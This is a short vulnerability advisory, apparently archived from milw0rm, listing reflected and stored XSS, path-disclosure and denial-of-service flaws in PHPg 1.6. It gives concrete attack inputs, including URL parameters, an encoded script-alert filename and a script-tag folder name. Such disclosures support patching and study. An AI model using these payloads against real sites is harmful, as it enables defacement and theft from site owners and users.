@@ -1,0 +1,17 @@
+PHPg 1.6 has a few XSSes, path disclosures, and a DoS vulnerability.
+Home: http://black-dwarf.com
+HS: http://www.hotscripts.com/Detailed/86225.html
+Found by: Anarchy Angel - http://hha.zapto.org
+
+Temp XSS: http://site.com/phpg/index.php?url="> [XSS]
+
+Temp XSS: http://site/com/phpg/main-display-file.php?file= [XSS]
+
+Path disclosure: http://site/com/phpg/main-display-file.php?file= [anarchything] .jpg<BR>
+As long as the img/vid file does not exist you will get file path.
+
+Static XSS/Path disclosure: Uploading a file with % 3Cscript% 3Ealert% 28% 22Hacked% 20by% 20Anarchy% 20Angel% 22% 29% 3B% 3C% 2Fscript% 3E.jpg as its name "with out the spaces" Will give a path disclosure on the main page and a XSS when you view the file.
+
+DoS: Make a new folder with < script >alert('Hacked by Anarchy Angel') and you will no longer be able to use the app, you can also just rename a folder to do the same thing.
+
+# milw0rm.com [2008-12-21]
